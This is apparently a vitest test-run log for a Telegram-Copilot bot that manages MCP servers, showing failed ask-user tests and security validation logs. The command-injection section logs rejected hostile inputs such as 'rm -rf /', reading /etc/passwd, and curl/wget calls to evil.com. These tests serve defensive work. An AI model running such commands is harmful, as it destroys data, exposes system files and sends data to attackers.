
> copilot-telegram-bot@0.1.0 test
> vitest run


[7m[1m[36m RUN [39m[22m[27m [36mv2.1.0[39m [90mD:/Juanma/MCP Copilot Telegram[39m

(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 2)
(Use `node --trace-warnings ...` to show where the warning was created)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 3)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 4)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 5)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 7)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 9)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 11)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 12)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 13)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 14)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 15)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 16)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 17)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 18)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 19)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 20)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 21)
(node:19448) PromiseRejectionHandledWarning: Promise rejection was handled asynchronously (rejection id: 22)
 [31mÃ”Ã˜Â»[39m tests/tools-ask-user.test.ts [2m ([22m[2m28 tests[22m [2m|[22m [31m15 failed[39m[2m)[22m[33m 4749[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mtoken matching[2m > [22mshould accept response from correct user with matching token[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mtoken matching[2m > [22mshould accept response without token verification when token not required[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mtimeout handling[2m > [22mshould cleanup state on timeout[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mcancellation[2m > [22mshould handle user cancellation via cancel()[39m
[31m     Ã”Ã¥Ã† Timeout: no se recibiâ”œâ”‚ respuesta del usuario[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mcancellation[2m > [22mshould cleanup state after cancellation[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mcancellation[2m > [22mshould clear timeout when cancelled[39m
[31m     Ã”Ã¥Ã† expected "clearTimeout" to be called at least once[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mconcurrent prompts[2m > [22mshould handle multiple simultaneous prompts with different tokens[39m
[31m     Ã”Ã¥Ã† Timeout: no se recibiâ”œâ”‚ respuesta del usuario[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mconcurrent prompts[2m > [22mshould route responses to correct promise based on token[39m
[31m     Ã”Ã¥Ã† Timeout: no se recibiâ”œâ”‚ respuesta del usuario[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mconcurrent prompts[2m > [22mshould prevent old token from resolving new prompt[39m
[31m     Ã”Ã¥Ã† Timeout: no se recibiâ”œâ”‚ respuesta del usuario[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mhasPending utility[2m > [22mshould return true when ask_user is pending[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mhasPending utility[2m > [22mshould return false after response received[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mhasPending utility[2m > [22mshould return false after timeout[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22mhasPending utility[2m > [22mshould return false after cancellation[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22medge cases[2m > [22mshould handle special characters in options[39m
[31m     Ã”Ã¥Ã† Timeout: no se recibiâ”œâ”‚ respuesta del usuario[39m
[31m   [31mâ”œÃ¹[31m ask_telegram_user tool[2m > [22medge cases[2m > [22mshould handle rapid cancel/restart cycles[39m
[31m     Ã”Ã¥Ã† Timeout: no se recibiâ”œâ”‚ respuesta del usuario[39m
[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mNetwork Retry Logic[2m > [22m[2mshould retry on network errors with exponential backoff[22m[39m
2026-02-12T17:11:35.624Z [[33mwarn[39m]: Network error detected - will retry {"attempt":1,"maxAttempts":5,"errorCode":"ECONNRESET","errorMessage":"Connection reset","retryInMs":10}

[90mstdout[2m | tests/auto-extension.test.ts[2m > [22m[2mAuto-Extension Logic[2m > [22m[2mAuto-extension triggers at 70% of timeout[2m > [22m[2mshould trigger auto-extension at 70% of initial timeout with recent activity[22m[39m
2026-02-12T17:11:30.697Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp","model":"claude-sonnet-4.5","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:30.697Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp","sessionCount":1}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mNetwork Retry Logic[2m > [22m[2mshould retry on network errors with exponential backoff[22m[39m
2026-02-12T17:11:35.652Z [[33mwarn[39m]: Network error detected - will retry {"attempt":2,"maxAttempts":5,"errorCode":"ECONNRESET","errorMessage":"Connection reset","retryInMs":20}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mNetwork Retry Logic[2m > [22m[2mshould not retry on authentication errors[22m[39m
2026-02-12T17:11:35.735Z [[31merror[39m]: Authentication/authorization error - not retrying {"error":"Unauthorized","code":null,"status":null}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mNetwork Retry Logic[2m > [22m[2mshould respect max attempts limit[22m[39m
2026-02-12T17:11:35.781Z [[33mwarn[39m]: Network error detected - will retry {"attempt":1,"maxAttempts":3,"errorCode":"ETIMEDOUT","errorMessage":"Timeout","retryInMs":10}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mNetwork Retry Logic[2m > [22m[2mshould respect max attempts limit[22m[39m
2026-02-12T17:11:35.793Z [[33mwarn[39m]: Network error detected - will retry {"attempt":2,"maxAttempts":3,"errorCode":"ETIMEDOUT","errorMessage":"Timeout","retryInMs":20}

[90mstdout[2m | tests/integration/verification.test.ts[2m > [22m[2mPhase 4: Comprehensive Verification Tests[2m > [22m[2mNetwork Retry Logic[2m > [22m[2mshould respect max attempts limit[22m[39m
2026-02-12T17:11:35.826Z [[31merror[39m]: Max retries exhausted - giving up {"maxAttempts":3,"lastError":"Timeout","lastErrorCode":"ETIMEDOUT"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2maddServer[2m > [22m[2mshould add STDIO server successfully[22m[39m
2026-02-12T17:11:35.702Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"new-stdio","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2maddServer[2m > [22m[2mshould add HTTP server successfully[22m[39m
2026-02-12T17:11:35.712Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"new-http","serverType":"http"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2maddServer[2m > [22m[2mshould reject duplicate server names[22m[39m
2026-02-12T17:11:35.716Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"duplicate","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2maddServer[2m > [22m[2mshould warn about potentially missing STDIO commands but not block[22m[39m
2026-02-12T17:11:35.731Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mremoveServer[2m > [22m[2mshould remove existing server[22m[39m
2026-02-12T17:11:35.739Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"to-remove","serverType":"stdio"}
2026-02-12T17:11:35.740Z [[32minfo[39m]: MCP server removed {"userId":1,"serverName":"to-remove"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mgetServer[2m > [22m[2mshould return server details[22m[39m
2026-02-12T17:11:35.746Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2menableServer[2m > [22m[2mshould enable disabled server[22m[39m
2026-02-12T17:11:35.756Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}
2026-02-12T17:11:35.757Z [[32minfo[39m]: MCP server enabled {"userId":1,"serverName":"test"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mdisableServer[2m > [22m[2mshould disable enabled server[22m[39m
2026-02-12T17:11:35.762Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}
2026-02-12T17:11:35.763Z [[32minfo[39m]: MCP server disabled {"userId":1,"serverName":"test"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2msetEnabled[2m > [22m[2mshould toggle server enabled state[22m[39m
2026-02-12T17:11:35.769Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateServerName[2m > [22m[2mshould accept valid names[22m[39m
2026-02-12T17:11:35.773Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}
2026-02-12T17:11:35.774Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-server","serverType":"stdio"}
2026-02-12T17:11:35.775Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test_server","serverType":"stdio"}
2026-02-12T17:11:35.776Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test123","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mAbsolute path validation against system PATH[2m > [22m[2mshould reject absolute paths not in system PATH[22m[39m
2026-02-12T17:11:35.785Z [[33mwarn[39m]: Executable not found in system PATH {"userId":1,"absolutePath":"/tmp/malicious/node","basename":"node"}
2026-02-12T17:11:35.786Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/tmp/malicious/node"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mAbsolute path validation against system PATH[2m > [22m[2mshould accept absolute paths that exist in system PATH[22m[39m
2026-02-12T17:11:35.790Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"valid-absolute-path","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mAbsolute path validation against system PATH[2m > [22m[2mshould reject Windows absolute paths not in PATH[22m[39m
2026-02-12T17:11:35.793Z [[33mwarn[39m]: Executable not found in system PATH {"userId":1,"absolutePath":"C:\\temp\\malicious\\node.exe","basename":"node.exe"}
2026-02-12T17:11:35.793Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"C:\\temp\\malicious\\node.exe"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mAbsolute path validation against system PATH[2m > [22m[2mshould accept Windows absolute paths in system PATH[22m[39m
2026-02-12T17:11:35.799Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"valid-windows-path","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould reject executable with malicious prefix like "node.evil.exe"[22m[39m
2026-02-12T17:11:35.803Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node.evil.exe","basename":"node.evil.exe","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould reject executable like "nodejs-malicious"[22m[39m
2026-02-12T17:11:35.806Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"nodejs-malicious","basename":"nodejs-malicious","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould reject "python.backdoor.exe"[22m[39m
2026-02-12T17:11:35.809Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"python.backdoor.exe","basename":"python.backdoor.exe","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould accept exact match "node"[22m[39m
2026-02-12T17:11:35.816Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-node","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould accept exact match "node.exe"[22m[39m
2026-02-12T17:11:35.820Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-node-exe","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould accept exact match "python"[22m[39m
2026-02-12T17:11:35.823Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-python","serverType":"stdio"}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould send heartbeat warning after HEARTBEAT_WARNING_INTERVAL without events[22m[39m
2026-02-12T17:11:35.798Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact basename matching (no startsWith bypass)[2m > [22m[2mshould accept exact match "python3.exe"[22m[39m
2026-02-12T17:11:35.826Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-python3-exe","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact extension validation[2m > [22m[2mshould reject double extension like "node.exe.malicious"[22m[39m
2026-02-12T17:11:35.829Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node.exe.malicious","basename":"node.exe.malicious","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact extension validation[2m > [22m[2mshould reject invalid extension like "node.bat.exe"[22m[39m
2026-02-12T17:11:35.834Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node.bat.exe","basename":"node.bat.exe","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact extension validation[2m > [22m[2mshould accept valid .exe extension[22m[39m
2026-02-12T17:11:35.837Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-valid-exe","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mExact extension validation[2m > [22m[2mshould accept valid .cmd extension[22m[39m
2026-02-12T17:11:35.840Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-valid-cmd","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCombined security tests[2m > [22m[2mshould reject absolute path with malicious basename[22m[39m
2026-02-12T17:11:35.842Z [[33mwarn[39m]: Executable not found in system PATH {"userId":1,"absolutePath":"/home/user/bin/python.backdoor.exe","basename":"python.backdoor.exe"}
2026-02-12T17:11:35.843Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/home/user/bin/python.backdoor.exe"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCombined security tests[2m > [22m[2mshould accept valid basename in system PATH[22m[39m
2026-02-12T17:11:35.845Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-valid-combo","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mError messages[2m > [22m[2mshould provide clear error for absolute path not in PATH[22m[39m
2026-02-12T17:11:35.848Z [[33mwarn[39m]: Executable not found in system PATH {"userId":1,"absolutePath":"/tmp/malicious/node","basename":"node"}
2026-02-12T17:11:35.848Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/tmp/malicious/node"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mError messages[2m > [22m[2mshould provide clear error for invalid basename[22m[39m
2026-02-12T17:11:35.851Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node.evil.exe","basename":"node.evil.exe","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCRITICAL: Absolute path bypass vulnerability (Issue #1)[2m > [22m[2mshould reject C:\Malicious\node.exe even though node.exe exists in PATH[22m[39m
2026-02-12T17:11:35.857Z [[33mwarn[39m]: SECURITY: Absolute path bypass attempt detected {"userId":1,"providedPath":"C:\\Malicious\\node.exe","resolvedInput":"C:\\Malicious\\node.exe","systemPaths":["C:\\Users\\Thalia\\AppData\\Roaming\\nvm\\v20.20.0\\node.exe"],"reason":"Provided path does not match any system PATH entry"}
2026-02-12T17:11:35.857Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"C:\\Malicious\\node.exe"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCRITICAL: Absolute path bypass vulnerability (Issue #1)[2m > [22m[2mshould reject /tmp/malicious/python even though python exists in PATH[22m[39m
2026-02-12T17:11:35.861Z [[33mwarn[39m]: SECURITY: Absolute path bypass attempt detected {"userId":1,"providedPath":"/tmp/malicious/python","resolvedInput":"D:\\tmp\\malicious\\python","systemPaths":["D:\\usr\\bin\\python"],"reason":"Provided path does not match any system PATH entry"}
2026-02-12T17:11:35.861Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"/tmp/malicious/python"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCRITICAL: Absolute path bypass vulnerability (Issue #1)[2m > [22m[2mshould accept C:\Program Files\nodejs\node.exe when it matches PATH exactly[22m[39m
2026-02-12T17:11:35.868Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"valid-exact-match","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCRITICAL: Absolute path bypass vulnerability (Issue #1)[2m > [22m[2mshould accept /usr/bin/python when it matches PATH exactly[22m[39m
2026-02-12T17:11:35.873Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"valid-exact-match-linux","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCRITICAL: Absolute path bypass vulnerability (Issue #1)[2m > [22m[2mshould handle multiple paths from where/which command[22m[39m
2026-02-12T17:11:35.877Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"multi-path-match","serverType":"stdio"}

[90mstdout[2m | tests/server-management.test.ts[2m > [22m[2mServerManagementService[2m > [22m[2mvalidateExecutable - Security Issue #C3[2m > [22m[2mCRITICAL: Absolute path bypass vulnerability (Issue #1)[2m > [22m[2mshould reject path not in multiple results from where/which[22m[39m
2026-02-12T17:11:35.882Z [[33mwarn[39m]: SECURITY: Absolute path bypass attempt detected {"userId":1,"providedPath":"C:\\Malicious\\python.exe","resolvedInput":"C:\\Malicious\\python.exe","systemPaths":["C:\\Python39\\python.exe","C:\\Program Files\\Python\\python.exe"],"reason":"Provided path does not match any system PATH entry"}
2026-02-12T17:11:35.882Z [[33mwarn[39m]: MCP executable rejected: absolute path not in system PATH {"userId":1,"command":"C:\\Malicious\\python.exe"}

 [32mÃ”Â£Ã´[39m tests/server-management.test.ts [2m ([22m[2m47 tests[22m[2m)[22m[90m 216[2mms[22m[39m
[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with semicolon injection[22m[39m
2026-02-12T17:11:35.686Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node; rm -rf /"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with pipe injection[22m[39m
2026-02-12T17:11:35.697Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node | cat /etc/passwd"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with AND operator[22m[39m
2026-02-12T17:11:35.700Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node && curl evil.com/steal"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with OR operator[22m[39m
2026-02-12T17:11:35.703Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node || wget evil.com/malware"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with backtick substitution[22m[39m
2026-02-12T17:11:35.706Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node `whoami`"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with $() substitution[22m[39m
2026-02-12T17:11:35.709Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node $(id)"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with redirection operators[22m[39m
2026-02-12T17:11:35.712Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node > /tmp/output"}
2026-02-12T17:11:35.713Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node < /etc/passwd"}
2026-02-12T17:11:35.714Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node 2>&1"}
2026-02-12T17:11:35.715Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node >> /var/log/hack"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with newline injection[22m[39m
2026-02-12T17:11:35.718Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node\nrm -rf /","basename":"node\nrm -rf ","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mMalicious MCP Commands[2m > [22m[2mshould reject command with carriage return injection[22m[39m
2026-02-12T17:11:35.723Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"node\rcurl evil.com","basename":"node\rcurl evil.com","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mShell Metacharacters in Arguments[2m > [22m[2mshould handle arguments with semicolons safely[22m[39m
2026-02-12T17:11:35.730Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"args-semicolon","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mShell Metacharacters in Arguments[2m > [22m[2mshould handle arguments with pipe characters safely[22m[39m
2026-02-12T17:11:35.734Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"args-pipe","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mShell Metacharacters in Arguments[2m > [22m[2mshould handle arguments with dollar signs safely[22m[39m
2026-02-12T17:11:35.738Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"args-dollar","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mShell Metacharacters in Arguments[2m > [22m[2mshould handle arguments with backticks safely[22m[39m
2026-02-12T17:11:35.744Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"args-backtick","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mShell Metacharacters in Arguments[2m > [22m[2mshould handle arguments with quotes safely[22m[39m
2026-02-12T17:11:35.748Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"args-quotes","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject bash executable[22m[39m
2026-02-12T17:11:35.753Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"bash","basename":"bash","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject sh executable[22m[39m
2026-02-12T17:11:35.759Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"sh","basename":"sh","allowedExecutables":["node","python3"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mExecutables Outside Allowlist[2m > [22m[2mshould reject perl executable[22m[39m
2026-02-12T17:11:35.762Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"perl","basename":"perl","allowedExecutables":["node","python3"]}

